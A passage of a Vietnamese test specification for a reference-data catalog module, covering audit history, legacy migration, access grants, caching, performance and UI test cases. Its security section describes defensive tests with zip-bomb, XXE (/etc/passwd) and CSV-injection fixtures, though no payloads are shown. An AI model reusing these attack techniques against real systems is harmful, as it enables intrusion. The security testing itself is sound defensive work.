- **Mong đợi** Mỗi thao tác có đúng một bản ghi với mã hành động `RDM_*` tương ứng, đủ trường chủ thể, thời điểm, địa chỉ nguồn, đối tượng, trước, sau, kết quả, `traceId` trùng `traceparent` của yêu cầu.

#### TC-07-257 · Xem lịch sử gộp và lọc
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-050 · API-07-072 · UI-07-02
- **Tiền điều kiện / dữ liệu** Danh mục sau TC-07-256.
- **Bước**
  1. `GET /catalogs/{c}/history`.
  2. Lọc `action=RDM_VERSION_PUBLISH`.
  3. Mở tab Lịch sử của UI-07-02.
- **Mong đợi** Bước 1 trả dòng thời gian giảm dần, mỗi mục có `summary` tiếng Việt. Bước 2 chỉ có một mục. Bước 3 hiển thị cùng dữ liệu.

#### TC-07-258 · Khoảng thời gian không hợp lệ và PH-13 không sẵn sàng
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-050 · ERR-07-009, 047
- **Tiền điều kiện / dữ liệu** —
- **Bước**
  1. Gọi với `from = 2022-01-01`, `to = 2026-11-21` (vượt 3 năm).
  2. Gọi với `from` sau `to`.
  3. Dừng giả lập PH-13, gọi lại hợp lệ.
- **Mong đợi** Bước 1, 2 `422` `ERR-07-009`. Bước 3 `503` `ERR-07-047`, thân có phần dữ liệu từ PH-07 và `partial = true`.

#### TC-07-259 · Che nội dung danh mục hạn chế và ghi nhận xuất lịch sử
- **Loại** Bảo mật · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-050 · FR-07-052
- **Tiền điều kiện / dữ liệu** CAT-RES có lịch sử sửa bản ghi.
- **Bước**
  1. U-T68-VW xem lịch sử CAT-RES.
  2. U-T68-AU xem và xuất CSV.
- **Mong đợi** Bước 1: `changes[]` giữ mã, che nhãn và thuộc tính. Bước 2: không che; có bản ghi kiểm toán `RDM_HISTORY_EXPORT`.

### TS-07-22 · Di trú dữ liệu Aita

**Mục tiêu.** Xác nhận công cụ di trú chuyển đủ và đúng dữ liệu bốn bảng EAV của Aita, đi qua các API nghiệp vụ, chạy lại được, và biên bản đối soát phát hiện mọi chênh lệch. Dữ liệu ở mục 2.6.

**Phủ.** FR-07-051; FR-00-090…092; BR-07-011, 025, 027; LGC-DMDC-001…019; UI-07-08.

**Tiền điều kiện chung.** MySQL 8 có `aita_seed.sql`; T68 đã nạp gói nền; U-T68-TA chạy công cụ.

#### TC-07-260 · Chạy thử sinh báo cáo, không ghi dữ liệu
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** IT (MIG)
- **Truy vết** FR-07-051 · FR-00-090 · LGC-DMDC-001…019
- **Tiền điều kiện / dữ liệu** 40 danh mục Aita.
- **Bước**
  1. Chạy công cụ ở chế độ chạy thử.
- **Mong đợi** Tác vụ loại `MIGRATION` hiện ở UI-07-08; báo cáo có 40 dòng, mỗi dòng một quyết định đề xuất, mã đề xuất, kiểu thuộc tính suy ra, vấn đề; số danh mục trong `ph07_rdm.catalog` của T68 không đổi.

#### TC-07-261 · Suy kiểu thuộc tính và đề xuất cột mã, cột cha
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** UT
- **Truy vết** FR-07-051 bước 4…6 · FR-07-022
- **Tiền điều kiện / dữ liệu** Bảng giá trị mẫu cho từng kiểu (BOOLEAN có ít nhất hai giá trị, INTEGER có số 0 đầu, ngày `31/02/2024`, ENUM ≤ 20 giá trị trên ≥ 100 dòng).
- **Bước**
  1. Chạy bộ suy kiểu trên từng cột mẫu.
- **Mong đợi** Kiểu khớp bảng ở FR-07-051 bước 6; cột toàn `1` không thành BOOLEAN; mã có số 0 đầu thành STRING; ngày không có thật làm cột thành STRING.

#### TC-07-262 · Đối chiếu COMMON: dùng chung, HYBRID, đồng bộ
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** IT (MIG)
- **Truy vết** FR-07-051 bước 7 · FR-07-048 · LGC-DMDC-017, 019
- **Tiền điều kiện / dữ liệu** Aita có "Giới tính" trùng COMMON, "Dân tộc" có 2 mã bổ sung, một danh mục `is_update = 1`.
- **Bước**
  1. Chạy thử.
- **Mong đợi** "Giới tính" đề xuất "dùng COMMON kèm ánh xạ" với hệ thống mã `AITA_T68`; "Dân tộc" đề xuất HYBRID cho 2 mã; danh mục `is_update = 1` đề xuất đăng ký đồng bộ quốc gia.

#### TC-07-263 · Phát hiện dữ liệu cá nhân
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** IT (MIG)
- **Truy vết** FR-07-051 bước 8 · BR-07-025 · ERR-07-036
- **Tiền điều kiện / dữ liệu** Một danh mục Aita có cột "Số CCCD" chứa chuỗi 12 chữ số.
- **Bước**
  1. Chạy thử.
  2. Chạy thật mà không bỏ thuộc tính đó.
- **Mong đợi** Bước 1 báo vấn đề "dữ liệu cá nhân", đề xuất loại bỏ. Bước 2 danh mục đó bị bỏ qua với `ERR-07-036`, các danh mục khác vẫn chạy.

#### TC-07-264 · Chạy thật đi qua API, chờ duyệt theo lô
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** IT (MIG)
- **Truy vết** FR-07-051 bước 10, 11 · API-07-002, 014, 017, 031 · BR-07-011, 027
- **Tiền điều kiện / dữ liệu** Cấu hình đã chốt sau TC-07-260.
- **Bước**
  1. Chạy thật.
  2. U-T68-DA1 duyệt và phát hành các phiên bản di trú trên UI-07-07.
- **Mong đợi** Bước 1 tạo danh mục với `legacy_ref`, phiên bản 1 `origin = MIGRATION` ở `IN_REVIEW`; kiểm toán của từng API có chủ thể U-T68-TA. Bước 2 phát hành được, cho phép `effectiveFrom` hồi tố theo BR-07-027; U-T68-TA không duyệt được (bốn mắt).

#### TC-07-265 · Đối soát phát hiện chênh lệch
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** IT (MIG)
- **Truy vết** FR-07-051 bước 12 · FR-00-091
- **Tiền điều kiện / dữ liệu** Sau TC-07-264, xóa tay một bản ghi và sửa một ô trong Datahub (trên bản sao CSDL thử).
- **Bước**
  1. Chạy đối soát.
- **Mong đợi** Biên bản (PDF, Excel) tô đỏ hai danh mục lệch, nêu số bản ghi lệch và ô có băm SHA-256 khác; trạng thái "chưa ký được".

#### TC-07-266 · Chạy lại không nạp trùng
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** IT (MIG)
- **Truy vết** FR-07-051 bước 13 · FR-00-092
- **Tiền điều kiện / dữ liệu** Chạy thật bị ngắt giữa lô thứ 2 của danh mục lớn.
- **Bước**
  1. Chạy lại công cụ.
- **Mong đợi** Danh mục đã có `legacy_ref` không tạo lại; lô đã nạp được bỏ qua nhờ `Idempotency-Key`; tổng số bản ghi khớp nguồn.

#### TC-07-267 · Bản kết xuất thiếu bảng hoặc dữ liệu biên
- **Loại** Âm, Biên · **Ưu tiên** P2 · **Tự động** IT (MIG)
- **Truy vết** FR-07-051 bước 1 · ERR-07-008, 009
- **Tiền điều kiện / dữ liệu** (a) Bản kết xuất thiếu bảng `category_details_value`; (b) danh mục có giá trị dài 2.000 ký tự, mã " ab01" và "AB01".
- **Bước**
  1. Chạy thử với (a).
  2. Chạy thử với (b).
- **Mong đợi** Bước 1 dừng với báo cáo lỗi, không ghi gì. Bước 2 giá trị 2.000 ký tự giữ nguyên (thuộc tính TEXT hoặc STRING 2.000); hai mã trùng sau chuẩn hóa bị báo vấn đề `ERR-07-008`, cột đó không được chọn làm cột mã.

### TS-07-23 · Khai thác danh mục RESTRICTED

**Mục tiêu.** Xác nhận chỉ HTTT được cấp quyền mới khai thác được danh mục hạn chế, cấp quyền có hiệu lực theo thời hạn và mất tác dụng ngay khi HTTT bị đình chỉ.

**Phủ.** FR-07-052; BR-07-019; API-07-075; ERR-07-003, 009, 018, 030.

#### TC-07-268 · Thay danh sách cấp quyền và khai thác
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-052 · BR-07-019 · API-07-075
- **Tiền điều kiện / dữ liệu** CAT-RES cấp cho `HT-DATDAI`.
- **Bước**
  1. U-T68-TA `PUT /catalogs/TRAM_QUAN_TRAC/access-grants` với `If-Match`, `reason`, thêm `HT-HOTICH` scope `rdm.read`, `expiresAt` = 2026-11-21T10:00+07:00.
  2. Trong ≤ 10 giây, APP-T68-READ gọi `GET /catalogs/TRAM_QUAN_TRAC/items`.
  3. Tua đồng hồ qua 10:00, gọi lại.
- **Mong đợi** Bước 1 `200`, `ETag` mới, KT: có (`RDM_ACCESS_GRANT_REPLACE` với phần thêm). Bước 2 `200`. Bước 3 `403` `ERR-07-030`.

#### TC-07-269 · Danh sách cấp quyền sai
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-052 · ERR-07-009, 018
- **Tiền điều kiện / dữ liệu** —
- **Bước**
  1. PUT với HTTT không tồn tại; HTTT trùng; scope `rdm.write`; `expiresAt` trong quá khứ; thiếu `reason`.
  2. PUT với `If-Match` cũ.
- **Mong đợi** Bước 1 mỗi trường hợp `422` `ERR-07-009`, danh sách không đổi. Bước 2 `412` `ERR-07-018`.

#### TC-07-270 · HTTT bị đình chỉ mất quyền ngay
- **Loại** Âm, Bảo mật · **Ưu tiên** P1 · **Tự động** IT
- **Truy vết** FR-07-052 bước 5 · ERR-07-030
- **Tiền điều kiện / dữ liệu** `HT-DATDAI` được cấp.
- **Bước**
  1. Giả lập PH-01 phát sự kiện `HT-DATDAI` chuyển `SUSPENDED`.
  2. APP-T68-QUERY gọi `items:query` trên CAT-RES sau 2 giây.
- **Mong đợi** `403` `ERR-07-030`; bộ đệm quyền ở mọi pod đã bị vô hiệu.

#### TC-07-271 · Nâng mức phân loại lên RESTRICTED cần xác nhận
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** E2E
- **Truy vết** FR-07-052 bước 6 · FR-07-004 · UI-07-03
- **Tiền điều kiện / dữ liệu** CAT-MUC (`INTERNAL`) có 3 HTTT khai thác trong 30 ngày.
- **Bước**
  1. U-T68-TA đổi phân loại CAT-MUC thành `RESTRICTED` trên UI-07-03.
- **Mong đợi** Hộp xác nhận nêu "3 hệ thống đã khai thác danh mục này trong 30 ngày sẽ mất quyền"; sau khi xác nhận, ba HTTT nhận `ERR-07-030`; tenant tỉnh thay danh sách cấp quyền của danh mục `COMMON` cho HTTT quốc gia bị `403` `ERR-07-003` (kiểm thêm bằng API).

### TS-07-24 · Tham số PH-07 theo tenant

**Mục tiêu.** Xác nhận tham số `07.rdm.*` đọc từ PH-18, tenant chỉ đổi được tham số mức `TENANT` trong miền cho phép, thay đổi áp dụng trong ≤ 60 giây và không ảnh hưởng tác vụ đang chạy.

**Phủ.** FR-07-053; DD-14; FRS §7.1; UI-07-13.

#### TC-07-272 · Đổi ngưỡng thay đổi lớn và áp dụng không cần khởi động lại
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** IT, E2E
- **Truy vết** FR-07-053 · UI-07-13 · BR-07-012
- **Tiền điều kiện / dữ liệu** `07.rdm.large-change-threshold-percent` = 10 (mặc định); bản nháp CAT-MUC đổi 1 trên 4 bản ghi (25%).
- **Bước**
  1. Phát hành thẳng CAT-MUC.
  2. U-T68-TA đặt tham số = 30 trên UI-07-13; chờ 60 giây; phát hành thẳng lại.
- **Mong đợi** Bước 1 `409` `ERR-07-016`. Bước 2 phát hành thành công; KT: có (`RDM_PARAMETER_UPDATE` do PH-18 ghi).

#### TC-07-273 · Tham số mức PLATFORM và giá trị ngoài miền
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-053 bước 4
- **Tiền điều kiện / dữ liệu** U-T68-TA.
- **Bước**
  1. Đổi `07.rdm.import-max-mb` (mức PLATFORM).
  2. Đổi `07.rdm.max-future-effective-days` = 5000.
- **Mong đợi** Cả hai bị PH-18 từ chối theo quy ước lỗi của PH-18; giá trị hiệu lực không đổi.

#### TC-07-274 · Tác vụ đang chạy giữ tham số lúc bắt đầu; PH-18 ngừng
- **Loại** Dương, Khả dụng · **Ưu tiên** P3 · **Tự động** IT
- **Truy vết** FR-07-053 bước 3 · `07.rdm.import-preview-ttl-hours`
- **Tiền điều kiện / dữ liệu** Tác vụ nhập `VALIDATED` tạo khi TTL = 24 giờ.
- **Bước**
  1. PA đổi TTL nền tảng thành 12 giờ; tua đồng hồ 13 giờ.
  2. Dừng giả lập PH-18; khởi động lại một pod `dh-data`.
- **Mong đợi** Bước 1 tác vụ vẫn `VALIDATED` (giữ 24 giờ ghi trong `options`). Bước 2 pod khởi động bằng giá trị mặc định đóng gói, tra cứu không lỗi.

## 5. Kịch bản kiểm thử phi chức năng

Các kịch bản dưới đây kiểm yêu cầu phi chức năng NFR-07, bảo mật và khả năng truy cập. Ngưỡng lấy từ FRS §7.2; cách đo, cấu hình tải và môi trường theo mục 1.3. Ca hiệu năng chỉ được tính đạt khi đạt ngưỡng ở hai lần đo liên tiếp (mục 1.5).

### TS-07-25 · Bộ đệm, ảnh chụp và chịu lỗi

**Mục tiêu.** Xác nhận khai thác danh mục vẫn đúng và nhanh khi bộ đệm lạnh, khi phát hành phiên bản mới, và tiếp tục phục vụ khi PostgreSQL hoặc Valkey ngừng (NFR-07-009, 010).

**Phủ.** FR-07-028; NFR-07-009, 010, 012; ADR-053.

#### TC-07-275 · Phát hành làm mới bộ đệm mọi pod
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** IT
- **Truy vết** FR-07-016, 026 · NFR-07-009
- **Tiền điều kiện / dữ liệu** Ba pod đã đệm CAT-MUC v1.
- **Bước**
  1. Phát hành v2 đổi tên một bản ghi.
  2. Sau 5 giây, gọi tra bản ghi đó trên từng pod.
- **Mong đợi** Cả ba pod trả tên mới; khóa của v1 trong Valkey vẫn còn (phiên bản bất biến) nhưng con trỏ "phiên bản hiện hành" đã đổi.

#### TC-07-276 · Tỷ lệ trúng đệm ổn định và phục hồi sau khởi động lại
- **Loại** Hiệu năng · **Ưu tiên** P1 · **Tự động** k6
- **Truy vết** NFR-07-009
- **Tiền điều kiện / dữ liệu** PERF; tải đọc 2.000 lượt/giây phân bố Zipf trên 1.000 danh mục.
- **Bước**
  1. Chạy 30 phút, đọc `rdm_cache_hit_ratio`.
  2. Khởi động lại toàn bộ pod, tiếp tục tải 15 phút.
- **Mong đợi** Bước 1 ≥ 95%. Bước 2 trở lại ≥ 95% trong ≤ 10 phút; không có lỗi `5xx`.

#### TC-07-277 · PostgreSQL ngừng: tra cứu phục vụ từ L2 và ảnh chụp
- **Loại** Khả dụng · **Ưu tiên** P1 · **Tự động** Chaos
- **Truy vết** NFR-07-010 · ADR-053
- **Tiền điều kiện / dữ liệu** SIT; bộ đệm ấm.
- **Bước**
  1. Chaos Mesh dừng PostgreSQL chính và bản sao trong 60 phút; giữ tải tra cứu 500 lượt/giây.
  2. Trong thời gian đó, gọi một API ghi.
- **Mong đợi** Tra cứu mã đã có trong L2 hoặc ảnh chụp trả `200` với tiêu đề `X-Rdm-Degraded: true`; tỷ lệ lỗi tra cứu < 0,1%. API ghi trả `503` `ERR-07-047`. Cảnh báo `RdmDatabaseDown` bật.

#### TC-07-278 · Valkey ngừng
- **Loại** Khả dụng · **Ưu tiên** P2 · **Tự động** Chaos
- **Truy vết** NFR-07-010
- **Tiền điều kiện / dữ liệu** SIT.
- **Bước**
  1. Dừng cả ba nút Valkey 10 phút dưới tải 1.000 lượt/giây.
- **Mong đợi** Không có lỗi `5xx`; p95 tra một mã ≤ 50 ms (đọc L1 hoặc CSDL); circuit breaker Valkey mở và đóng lại khi Valkey trở lại.

#### TC-07-279 · Garage ngừng khi phát hành
- **Loại** Khả dụng · **Ưu tiên** P2 · **Tự động** Chaos
- **Truy vết** FR-07-016 · ERR-07-047
- **Tiền điều kiện / dữ liệu** Bản nháp CAT-MUC đã duyệt.
- **Bước**
  1. Cắt mạng tới Garage, phát hành.
  2. Khôi phục mạng sau 5 phút.
- **Mong đợi** Phát hành thành công (ảnh chụp sinh nền); `GET .../snapshots/{v}` trả `503` `ERR-07-047` có `Retry-After` trong lúc chờ; sau khôi phục, ảnh chụp sinh xong trong ≤ 2 phút và EVT-07-05 có `snapshotUri`.

#### TC-07-280 · Ảnh chụp bị sửa bị phát hiện
- **Loại** Bảo mật · **Ưu tiên** P2 · **Tự động** IT
- **Truy vết** FR-07-028 · ADR-053
- **Tiền điều kiện / dữ liệu** Ảnh chụp v1 CAT-LH.
- **Bước**
  1. Sửa một byte của đối tượng ảnh chụp trong MinIO.
  2. `dh-runtime` nạp ảnh chụp.
- **Mong đợi** Thư viện tra cứu từ chối nạp vì SHA-256 lệch metadata, ghi cảnh báo, tiếp tục dùng ảnh chụp cũ trong bộ nhớ.

#### TC-07-281 · Bộ nhớ pod khi nhập, xuất, phát hành danh mục lớn nhất
- **Loại** Hiệu năng · **Ưu tiên** P1 · **Tự động** k6
- **Truy vết** NFR-07-012
- **Tiền điều kiện / dữ liệu** PERF; danh mục 200.000 bản ghi, 100 thuộc tính.
- **Bước**
  1. Đồng thời: nhập F-100K, xuất 200.000 dòng xlsx, phát hành danh mục 200.000 bản ghi.
- **Mong đợi** Không pod nào bị OOM (giới hạn 2 GB); L1 ≤ 256 MB; tra cứu đồng thời vẫn đạt NFR-07-001.

#### TC-07-282 · Hai pod cùng lấy một tác vụ nền
- **Loại** Biên · **Ưu tiên** P1 · **Tự động** IT
- **Truy vết** FR-07-021 · D03-02-PH07 §4.4
- **Tiền điều kiện / dữ liệu** 20 tác vụ nhập `UPLOADED`, ba pod.
- **Bước**
  1. Bật worker trên cả ba pod cùng lúc; dừng đột ngột một pod giữa chừng.
- **Mong đợi** Mỗi tác vụ được đúng một pod xử lý (`lease_owner`); tác vụ của pod bị dừng được pod khác nhận lại sau khi `lease_until` hết hạn; không có tác vụ nào ghi hai lần vào bản nháp.

### TS-07-26 · Giao diện E2E và yêu cầu dùng chung FR-00

**Mục tiêu.** Chạy các luồng người dùng chính của D03-06-PH07 mục 22 từ đầu tới cuối trên ba trình duyệt, và kiểm các yêu cầu dùng chung của giao diện (định dạng Việt Nam, URL giữ trạng thái, tác vụ nền).

**Phủ.** FR-07-018; FR-00-020…060; UI-07-01…13.

#### TC-07-283 · Luồng cập nhật danh mục địa phương theo văn bản mới
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** E2E
- **Truy vết** FR-07-011, 012, 015, 016 · UI-07-01, 02, 05, 06, 07 · LGC-DMDC-009…011
- **Tiền điều kiện / dữ liệu** U-T68-DS-NV, U-T68-DA1; CAT-LH.
- **Bước**
  1. DS-NV tìm "loại hình", mở chi tiết, tạo bản nháp, sửa 2 bản ghi, nhập F-OK10, xem khác biệt, trình.
  2. DA1 vào "Việc của tôi", mở UI-07-07, duyệt và phát hành với ngày hiệu lực hôm sau.
- **Mong đợi** Mỗi bước hiển thị thông báo đúng D03-06-PH07; sau bước 2, UI-07-02 hiện phiên bản mới với nhãn "Hiệu lực từ {ngày}". Không có lỗi trong bảng điều khiển trình duyệt.

#### TC-07-284 · Sửa bản ghi trên lưới bằng bàn phím
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** E2E
- **Truy vết** FR-07-018 · UI-07-05
- **Tiền điều kiện / dữ liệu** Bản nháp CAT-LH.
- **Bước**
  1. Chỉ dùng bàn phím: di chuyển ô bằng mũi tên, F2 sửa tên, Tab sang ô kế, Ctrl+S lưu.
- **Mong đợi** Lưu được; vùng `role="status"` đọc "Đã lưu 1 bản ghi."

#### TC-07-285 · Xung đột sửa đồng thời theo từng dòng
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** E2E
- **Truy vết** FR-07-018 · ERR-07-018 · UI-07-05
- **Tiền điều kiện / dữ liệu** Hai phiên trình duyệt của DS-NV và TA cùng mở bản nháp.
- **Bước**
  1. Cả hai sửa cùng một bản ghi; TA lưu trước; DS-NV lưu sau cùng 3 dòng khác.
- **Mong đợi** 3 dòng khác của DS-NV lưu được; dòng xung đột hiện dấu ⚠ với ba lựa chọn "Xem khác biệt", "Giữ của tôi", "Lấy bản mới".

#### TC-07-286 · URL giữ trạng thái lọc, trang, tab
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** E2E
- **Truy vết** FR-00-021 · UI-07-01, 02
- **Tiền điều kiện / dữ liệu** U-T68-VW.
- **Bước**
  1. Lọc nguồn "Tỉnh", sang trang 2, mở danh mục, chọn tab Phiên bản; sao chép URL, mở tab mới.
  2. Sửa URL `page=abc`.
- **Mong đợi** Bước 1 tab mới hiển thị đúng trạng thái. Bước 2 trang không lỗi, về trang 1.

#### TC-07-287 · Định dạng Việt Nam
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** E2E
- **Truy vết** FR-00-022 · D03-06-PH07 mục 2.3
- **Tiền điều kiện / dữ liệu** CAT-BIG.
- **Bước**
  1. Xem số bản ghi, ngày hiệu lực, giá trị thập phân.
- **Mong đợi** "100.000"; "01/12/2026"; "12,50"; giờ theo Asia/Ho_Chi_Minh.

#### TC-07-288 · Khay tác vụ nền và thông báo khi xong
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** E2E
- **Truy vết** FR-00-054, 060 · UI-07-08
- **Tiền điều kiện / dữ liệu** F-100K.
- **Bước**
  1. Bắt đầu nhập F-100K, chuyển sang UI-07-01.
- **Mong đợi** Khay "1 tác vụ nền" cập nhật tiến độ; khi `VALIDATED`, có thông báo kèm liên kết quay lại bước 3 của trình hướng dẫn.

#### TC-07-289 · Trình hướng dẫn nhập: ghép cột và khuôn Aita
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** E2E
- **Truy vết** FR-07-021, 022 · UI-07-06 · LGC-DMDC-005
- **Tiền điều kiện / dữ liệu** F-AITA-X.
- **Bước**
  1. Tải F-AITA-X ở chế độ tạo danh mục.
- **Mong đợi** Giao diện nhận dạng "Khuôn Aita", điền sẵn tên danh mục từ ô A2, đề xuất ghép cột từ dòng 4; người dùng sửa được trước khi xác nhận.

#### TC-07-290 · Lỗi máy chủ hiển thị đúng thông điệp
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** E2E
- **Truy vết** D03-06-PH07 mục 5.3 · ERR-07-047
- **Tiền điều kiện / dữ liệu** Máy chủ giả lập (Prism) trả `503` `ERR-07-047`, `500` không mã.
- **Bước**
  1. Tải UI-07-01 với hai phản hồi lỗi.
- **Mong đợi** `503`: thông điệp tiếng Việt và nút "Thử lại"; `500`: thông điệp chung kèm mã theo dõi `traceId` để báo hỗ trợ; không hiện ngăn xếp lỗi.

#### TC-07-291 · Giảm trong suốt và tương phản cao
- **Loại** Truy cập · **Ưu tiên** P2 · **Tự động** E2E (ảnh chụp)
- **Truy vết** NFR-00-043 · D03-06-PH07 mục 20.5
- **Tiền điều kiện / dữ liệu** Playwright giả lập `prefers-reduced-transparency: reduce`, `prefers-reduced-motion: reduce`, `forced-colors: active`.
- **Bước**
  1. Chụp UI-07-01, 05, 07 ở mỗi chế độ.
- **Mong đợi** Không còn `backdrop-filter`; mọi thông tin vẫn đọc được; ảnh khớp ảnh chuẩn đã duyệt.

#### TC-07-292 · Hiệu năng giao diện sửa 1.000 dòng
- **Loại** Hiệu năng · **Ưu tiên** P2 · **Tự động** E2E (web-vitals)
- **Truy vết** NFR-00-005 · UI-07-05
- **Tiền điều kiện / dữ liệu** Bản nháp CAT-BIG; máy thử 4 nhân, 8 GB.
- **Bước**
  1. Mở UI-07-05, cuộn hết 1.000 dòng đầu, sửa 20 ô.
- **Mong đợi** LCP ≤ 2,5 giây; INP ≤ 200 ms; không có khung hình dài quá 200 ms khi cuộn.

### TS-07-27 · Hiệu năng (k6)

**Mục tiêu.** Đo các ngưỡng NFR-07-001…008, 011 trên môi trường PERF với dữ liệu quy mô thật (34 tenant × 1.000 danh mục). Kịch bản k6 nằm ở `perf/rdm/*.js`; kết quả đẩy sang Prometheus và đính vào báo cáo phát hành.

**Phủ.** NFR-07-001…008, 011; D05-03 (kế hoạch kiểm thử hiệu năng chung).

| Mã | Tên | Tải | Ngưỡng đạt | Truy vết |
|---|---|---|---|---|
| TC-07-293 | Tra một mã, bộ đệm ấm | 5.000 lượt/giây/tenant, 15 phút | p95 ≤ 20 ms, p99 ≤ 50 ms, lỗi < 0,1% | NFR-07-001 · FR-07-026 |
| TC-07-294 | Tra lô 500 mã | 200 lượt/giây | p95 ≤ 150 ms | NFR-07-002 · FR-07-027 |
| TC-07-295 | Chuyển mã lô 500 qua ánh xạ | 200 lượt/giây | p95 ≤ 150 ms | NFR-07-002 · FR-07-042 |
| TC-07-296 | Lấy trang 1.000 bản ghi | 100 lượt/giây | p95 ≤ 300 ms | NFR-07-003 · FR-07-028 |
| TC-07-297 | Truy vấn DSL trên CAT-BIG (5 mẫu truy vấn) | 50 lượt/giây | p95 ≤ 500 ms; truy vấn quá 2 giây bị ngắt | NFR-07-004 · FR-07-032 |
| TC-07-298 | Nhập F-100K | 1 tác vụ, lặp 5 lần | Xem trước ≤ 2 phút; commit ≤ 60 giây | NFR-07-005 · FR-07-021 |
| TC-07-299 | Xuất 100.000 dòng xlsx; xuất đồng bộ 10.000 dòng | 1 tác vụ; 10 lượt/phút | ≤ 60 giây; ≤ 5 giây | NFR-07-006 · FR-07-024 |
| TC-07-300 | Phát hành 50.000 bản ghi kể cả ảnh chụp | 1 lần, lặp 5 lần | ≤ 30 giây; sự kiện ≤ 5 giây | NFR-07-007 · FR-07-016 |
| TC-07-301 | Thông lượng toàn cụm trên dữ liệu quy mô đầy đủ | 20.000 lượt/giây, 3 pod, 1 giờ, 34 tenant × 1.000 danh mục | Không suy giảm p95 quá 20% so với 15 phút đầu | NFR-07-008, 011 |
| TC-07-302 | Thời lượng (soak) | 30% tải đỉnh, 8 giờ | Không rò bộ nhớ (heap sau GC tăng < 5%), không tăng lỗi | NFR-07-008, 012 |
| TC-07-303 | Chuyển mã ĐVHC lô 1.000 | 50 lượt/giây | p95 ≤ 300 ms | FR-07-046 |

Mỗi ca ở bảng trên có loại Hiệu năng, ưu tiên P1 (TC-07-293, 297, 298, 300, 301) hoặc P2 (các ca còn lại), tự động bằng k6. Dữ liệu dùng chung là bộ quy mô NFR-07-011 nạp sẵn ở PERF; tiền điều kiện chung là bộ đệm đã làm ấm 10 phút (trừ TC-07-298…300 không phụ thuộc bộ đệm).

### TS-07-28 · Bảo mật (ASVS)

**Mục tiêu.** Kiểm các kiểm soát an toàn của PH-07 theo OWASP ASVS 5.0 và yêu cầu ATTT cấp độ 3 (D03-07, mã SEC-40…49 nhóm ứng dụng). Ca rò rỉ chéo tenant nằm riêng ở TS-07-19.

**Phủ.** ASVS V4 (kiểm soát truy cập), V5 (kiểm tra đầu vào), V8 (bảo vệ dữ liệu), V12 (tệp), V13 (API); SEC-40…49; DD-12.

#### TC-07-304 · Tệp giả mạo đuôi
- **Loại** Bảo mật · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-021 · DD-12 · ERR-07-019 · ASVS V12
- **Tiền điều kiện / dữ liệu** F-FAKE.
- **Bước**
  1. Tải F-FAKE vào bản nháp CAT-LH.
- **Mong đợi** Tác vụ `FAILED` với `ERR-07-019` (kiểu nội dung theo chữ ký tệp không phải xlsx) hoặc `ERR-07-038` nếu bộ quét phát hiện trước; tệp bị xóa khỏi vùng tạm.

#### TC-07-305 · Tệp chứa mẫu EICAR
- **Loại** Bảo mật · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** DD-12 · ERR-07-038
- **Tiền điều kiện / dữ liệu** F-EICAR.
- **Bước**
  1. Tải F-EICAR.
- **Mong đợi** Tác vụ `SCANNING` → `FAILED`, `ERR-07-038`; không có dòng nào trong `import_row`; KT: có (sự kiện an ninh tệp nhiễm).

#### TC-07-306 · Bom nén
- **Loại** Bảo mật · **Ưu tiên** P1 · **Tự động** IT
- **Truy vết** FR-07-021 · ERR-07-019 · ASVS V12.1
- **Tiền điều kiện / dữ liệu** F-ZIPBOMB.
- **Bước**
  1. Tải F-ZIPBOMB.
- **Mong đợi** Bộ đọc dừng khi tỉ lệ nén vượt ngưỡng; `FAILED` `ERR-07-019`; bộ nhớ pod không tăng quá 200 MB.

#### TC-07-307 · XXE trong xlsx
- **Loại** Bảo mật · **Ưu tiên** P1 · **Tự động** IT
- **Truy vết** FR-07-021 · ASVS V5.5
- **Tiền điều kiện / dữ liệu** F-XXE.
- **Bước**
  1. Tải F-XXE.
- **Mong đợi** Thực thể ngoài không được phân giải; không có nội dung `/etc/passwd` trong dữ liệu xem trước hay nhật ký.

#### TC-07-308 · Chèn công thức khi xuất (CSV injection)
- **Loại** Bảo mật · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-024 · ASVS V5.2
- **Tiền điều kiện / dữ liệu** F-FORMULA đã nhập vào bản nháp thử.
- **Bước**
  1. Xuất CSV và xlsx.
- **Mong đợi** Ô bắt đầu bằng `=`, `+`, `-`, `@`, tab, CR được thêm dấu nháy đơn đầu ô; mở trong trình bảng tính không chạy công thức.

#### TC-07-309 · Thao túng định danh đối tượng (IDOR) trong tenant
- **Loại** Bảo mật · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** ASVS V4.2 · ERR-07-046
- **Tiền điều kiện / dữ liệu** U-T68-DS-MT, tác vụ nhập của U-T68-DS-NV.
- **Bước**
  1. DS-MT xác nhận ghi (`commit`) tác vụ nhập của DS-NV.
- **Mong đợi** `403` `ERR-07-046`.

#### TC-07-310 · Thiếu If-Match và chống ghi đè mất dữ liệu
- **Loại** Bảo mật, Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** ERR-07-040 · ASVS V13
- **Tiền điều kiện / dữ liệu** —
- **Bước**
  1. Gọi các API sửa (API-07-004, 014, 028) không có `If-Match`.
- **Mong đợi** `400` `ERR-07-040`.

#### TC-07-311 · Giới hạn tần suất và kích thước thân
